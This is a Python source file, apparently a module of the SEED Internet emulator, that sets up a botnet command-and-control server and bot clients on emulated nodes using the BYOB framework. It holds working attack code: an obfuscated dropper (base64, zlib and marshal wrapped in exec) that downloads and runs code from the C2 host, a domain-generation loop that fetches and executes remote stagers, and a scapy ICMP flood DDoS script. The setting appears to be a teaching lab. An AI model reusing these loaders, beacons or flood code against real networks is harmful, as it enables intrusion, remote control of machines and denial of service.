#!/usr/bin/env python3
# encoding: utf-8
# __author__ = 'Demon'
from seedemu.core import Node, Service, Server
from typing import Dict
import zlib, base64, marshal, pkgutil, inspect

BotnetServerFileTemplates: Dict[str, str] = {}

BotnetServerFileTemplates['payload'] = pkgutil.get_data(__name__, 'config/payload.txt').decode("utf-8")
BotnetServerFileTemplates['stager'] = pkgutil.get_data(__name__, 'config/stager.txt').decode("utf-8")
BotnetServerFileTemplates['dropper'] = """import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))
"""
BotnetServerFileTemplates['start_command'] = """
printf "%s" "waiting for C2 Server network ready ..."
while ! ping -c 1 -n -w 1 {C2ServerIp} &> /dev/null
do
    printf "%c" "."
done
printf "\\n%s\\n"  "Server is ready"
sleep 3
python3 /tmp/BotClient.py
"""

BotnetServerFileTemplates['dga_dropper'] = """
{dga}

import random,sys,zlib,base64,marshal,json,urllib, time
if sys.version_info[0] > 2:
    from urllib import request

while True:
    time.sleep(4)
    try:
        domain_list = dga()
        domain = random.choice(domain_list)
        dropper_url = 'http://'+domain+':446//stagers/b6H.py'

        urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
        exec(urlopen(dropper_url).read())
    except Exception:
        print("[*] Connection error with domain {{}}, retrying...".format(domain))
        continue

"""


BotnetServerFileTemplates['ddos_module'] = """from scapy.all import *
import sys

target = sys.argv[1]

while True:
    ip_hdr = IP(dst=target)
    packet = ip_hdr/ICMP()/("m"*60000) #send 60k bytes of junk
    send(packet)"""

DGA_DEFAULT_FUNCTION = """
def dga() -> list:
    #Generate 10 domains for the given time.
    domain_list = []
    domain = ""
    import math, datetime
    today = datetime.datetime.utcnow()
    hour = today.hour
    day = today.day
    minute = today.minute
    minute = int(math.ceil(minute/5))*5

    for i in range(16):
        day = ((day ^ 8 * day) >> 11) ^ ((day & 0xFFFFFFF0) << 17)
        hour = ((hour ^ 4 * hour) >> 25) ^ 16 * (hour & 0xFFFFFFF8)
        minute = ((minute ^ (minute << 13)) >> 19) ^ ((minute & 0xFFFFFFFE) << 12)
        domain += chr(((day ^ hour ^ minute) % 25) + 97)
        if i > 6:
            domain_list.append(domain+ ".com")

    return domain_list
"""


class BotnetServer(Server):
    """!
    @brief The BotnetServer class.
    """

    __port: int

    def __init__(self):
        """!
        @brief BotnetServer constructor.
        """
        self.__port = 445

    def setPort(self, port: int):
        """!
        @brief Set C2 port.

        @param port port.
        """
        ## ! todo, not support to change port right now
        self.__port = port

    def install(self, node: Node):
        """!
        @brief Install the Botnet C2 server.
        """
        address = str(node.getInterfaces()[0].getAddress())

        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') # Dependencies software
        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/') #Install Byob framework
        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt') #Dependencies for Byob python lib.
        node.setFile('/tmp/byob/byob/modules/payloads/b6H.py', BotnetServerFileTemplates['payload'].replace("{serverHost}", address)) # Copy payload to C2 server without manually generating by ourself.
        node.setFile('/tmp/byob/byob/modules/stagers/b6H.py', BotnetServerFileTemplates['stager'].replace("{serverHost}", address)) # Copy stager to C2 server without manually generating by ourself.
        node.appendStartCommand('cd /tmp/byob/byob/; echo "exit\ny" | python3 server.py --port {} &'.format(self.__port)) # Start C2 process in the background .

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetServer'

        return out

class BotnetClientServer(Server):
    """!
    @brief The BotnetClientServer class.
    """

    __port: int

    def __init__(self):
        """!
        @brief BotnetClient constructor.
        """
        self.__port = 445
        self.__module = []

    def setPort(self, port: int):
        """!
        @brief Set HTTP port.

        @param port port.
        """
        ## ! todo, not support to change port right now
        self.__port = port

    def setServer(self, c2_server = '127.0.0.1', enable_dga = False, dga = None):
        """!
        @brief BotnetClient constructor.

        @param c2_server C2 server address.
        @param enable_dga (optional) set true to enable DGA.
        @param dga (optional) DGA function, used for generating multiple random C2 domains.
        """
        self.__c2_server_url = 'http://{}:446//stagers/b6H.py'.format(c2_server)
        self.__c2_server_ip = c2_server

        if not enable_dga: # Not Enable DGA, using IP to connect to C2 server
            self.__dropper = BotnetServerFileTemplates['dropper']\
                        .format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()"
                                                                      .format(repr(self.__c2_server_url)),2)))))
        else:
            if dga is None: # Enable DGA, using default dga function
                dga_source_code = DGA_DEFAULT_FUNCTION
            else: # Enable DGA, using user provided dga function
                dga_source_code = inspect.getsource(dga)
            self.__dropper = BotnetServerFileTemplates['dga_dropper'].format(dga = dga_source_code)

    def setModule(self, filename: str, file_src: str):
        """!
        @brief pass file to bot client into folder /tmp/.
        @param filename the file name will be in tmp folder.
        @param file_src file path.
        """

        file_content = open(file_src, 'r').read()
        self.__module.append({"filename": filename, "file_content": file_content})

    def install(self, node: Node):
        """!
        @brief Install the service.
        """
        if len(self.__module) > 0: #if have modules, add them in bot client
            for m in self.__module:
                node.setFile('/tmp/'+ m.get('filename'), m.get('file_content'))
        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') # Dependencies software
        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/') #Install Byob framework
        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt') # Dependencies for Byob
        node.addBuildCommand('pip3 install scapy') # Dependencies for simple DDoS module
        node.setFile('/tmp/BotClient.py', self.__dropper) # Add Bot client payload
        node.setFile('/tmp/ddos.py', BotnetServerFileTemplates['ddos_module'])
        # start_command used for making sure the C2 server can be connected after network configuration ready.
        node.appendStartCommand(BotnetServerFileTemplates['start_command'].format(C2ServerIp = self.__c2_server_ip))

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetClient'

        return out

class BotnetService(Service):
    """!
    @brief Botnet C2 server service.
    """

    def __init__(self):
        """!
        @brief BotnetService constructor.
        """
        super().__init__()
        self.addDependency('Base', False, False)

    def _createServer(self) -> Server:
        return BotnetServer()

    def getName(self) -> str:
        return 'BotnetService'

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetServiceLayer\n'

class BotnetClientService(Service):
    """!
    @brief Botnet client service.
    """

    def __init__(self):
        """!
        @brief BotnetService constructor.
        """
        super().__init__()
        self.addDependency('Base', False, False)

    def _createServer(self) -> Server:
        return BotnetClientServer()

    def getName(self) -> str:
        return 'BotnetClientService'

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetClientServiceLayer\n'